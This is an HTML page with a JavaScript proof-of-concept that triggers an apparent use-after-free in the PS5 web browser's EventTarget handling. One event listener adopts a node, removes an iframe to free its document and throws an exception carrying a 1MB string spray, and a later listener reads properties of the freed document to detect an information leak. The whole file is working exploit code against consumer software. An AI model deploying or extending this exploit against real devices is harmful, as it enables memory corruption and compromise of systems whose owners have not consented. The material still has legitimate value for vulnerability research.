<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>PS5 EventTarget UAF Info Leak Test</title>
</head>
<body>
<button id="btn" style="font-size:24px; padding:20px;">Run UAF Test</button>
<pre id="log" style="white-space:pre-wrap; word-break:break-all; background:#111; color:#0F0; padding:10px;"></pre>
<script>
const L = s => { document.getElementById('log').textContent += s + '\n'; };

document.getElementById('btn').onclick = () => {
    L('[*] Starting EventTarget UAF Info Leak test...');
    try {
        const f = document.body.appendChild(document.createElement('iframe'));
        const a = document.createElement('div');
        const b = a.appendChild(document.createElement('div'));

        // Listener 1: Frees the Document and throws an exception
        a.addEventListener('a', function() {
            L('[1] Listener 1: Freeing document and throwing...');
            document.adoptNode(a);
            f.remove();
            // Original used 64MB string. Let's try without the massive spray first,
            // just to see if we can read the stale pointer without immediately crashing.
            throw { sourceURL: 'A'.repeat(1024 * 1024) }; // 1MB spray
        });

        // Listener 2: Buffer listener
        a.addEventListener('a', () => {
            L('[2] Listener 2: Buffer executed.');
        });

        // Listener 3: Attempts to read properties from the freed Document
        a.addEventListener('a', function() {
            L('[3] Listener 3: Attempting to read freed document...');
            let doc = f.contentDocument;
            if (!doc) {
                L('[3] f.contentDocument is null. No UAF object to read.');
                return;
            }
            
            L('[3] Got an object! Attempting reads...');
            
            // Try simple integer properties first (less likely to trigger complex virtual calls)
            try { L('  nodeType: ' + doc.nodeType); } catch(e) { L('  nodeType ERR: ' + e); }
            try { L('  childNodes.length: ' + doc.childNodes.length); } catch(e) { L('  childNodes.length ERR: ' + e); }
            
            // Try string properties
            try { L('  URL: ' + doc.URL); } catch(e) { L('  URL ERR: ' + e); }
            try { L('  readyState: ' + doc.readyState); } catch(e) { L('  readyState ERR: ' + e); }
            
            L('[3] Reads finished. If values look corrupted (e.g. nodeType is a huge number), we have a leak!');
        });

        L('[*] Dispatching event...');
        b.dispatchEvent(new Event('a', { bubbles: true }));
        L('[*] Dispatch returned.');

    } catch (e) {
        L('[!] Uncaught error: ' + e.message);
    }
};
</script>
</body>
</html>
